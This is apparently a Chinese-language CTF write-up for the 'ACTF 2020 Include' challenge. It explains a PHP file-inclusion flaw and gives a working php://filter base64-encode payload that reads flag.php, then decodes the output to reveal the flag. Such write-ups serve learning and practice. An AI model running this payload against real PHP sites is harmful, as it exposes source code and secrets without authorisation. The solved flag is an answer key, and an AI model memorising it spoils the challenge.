---
title: ACTF 2020 Include
subtitle: 
date: 2023-11-06T12:53:29+08:00
slug: 85d9197
draft: false
tags:
  - 任意文件读取
categories:
  - CTF
---

<!--more-->
# ?file=xxx

  

用burp suite读取到（其实直接看URL也能看到，本题属于hackbar都不用的）：

```http

GET /?file=flag.php HTTP/1.1

```

  

---

  

# =php://filter

  

- 1.php://filter 可以获取指定文件源码，`php://filter`与包含函数结合时，`php://filter`流会被当作php文件执行。

所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。

  

- 2.`php://filter`伪协议文件包含读取源代码，加上`(read=)convert.base64-encode`，（那个`read=`本题可以不用添加），用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。

  

---

  

# payload

  

```http

http://xxx.com/?file=php://filter/convert.base64-encode/resource=flag.php

```

  

得到`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDc1MmI3NDYtZWI2Yi00NjZkLWE4MWMtNGYzZTdhYWNjYzQ3fQo=`

因为是经过base64编码后输出的结果，所以进行base64解码后可以得到：

```php

<?php

echo "Can you find out the flag?";

//flag{0752b746-eb6b-466d-a81c-4f3e7aaccc47}

```

也就得到了flag。